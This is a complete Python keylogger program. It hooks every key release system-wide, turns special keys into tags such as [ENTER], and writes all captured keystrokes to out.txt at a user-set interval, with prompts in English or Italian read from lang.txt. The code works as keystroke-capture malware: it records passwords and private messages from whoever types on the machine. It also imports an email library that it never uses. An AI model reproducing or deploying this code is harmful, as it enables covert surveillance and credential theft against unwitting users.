import pythoncom
import keyboard
import smtplib
import os
import shutil
from threading import Semaphore, Timer


class Keylogger:
    def __init__(self):
        self.get_lang()
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        print(name)
        self.log += name

    def report(self):
        if self.log:
            if "out.txt" in os.listdir():
                with open("out.txt", "a") as out_file:
                    out_file.write(self.log)
            else:
                with open("out.txt", "w") as out_file:
                    out_file.write(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        while True:
            try:
                if self.language == "English":
                    choice = int(input("Enter the number of seconds after which to write output to a file: "))
                else:
                    choice = int(input("Immettere il numero di secondi dopo cui scrivere l'output su un file: "))
                continue_ = True
            except Exception:
                if self.language == "English":
                    print("You have not entered a valid choice!")
                else:
                    print("Non hai inserito una scelta valida!")
                continue_ = False
            if continue_:
                if choice >= 0 and choice <= 3600:
                    self.interval = choice
                    break
                else:
                    if self.language == "English":
                        print("You have not entered a valid choice!")
                    else:
                        print("Non hai inserito una scelta valida!")
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

    def get_lang(self):
        if "lang.txt" in os.listdir():
            lang_file_path = "lang.txt"
        else:
            lang_file_path = "..\\lang.txt"
        with open(lang_file_path, "r") as lang_file:
            list_ = lang_file.readlines()
            self.language = list_[0]
            lang_list = list(self.language)
            if lang_list[-1] == "\n":
                lang_list.pop()
            self.language = "".join(lang_list)
            with open(lang_file_path, "w") as lang_file:
                lang_file.write(self.language)


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
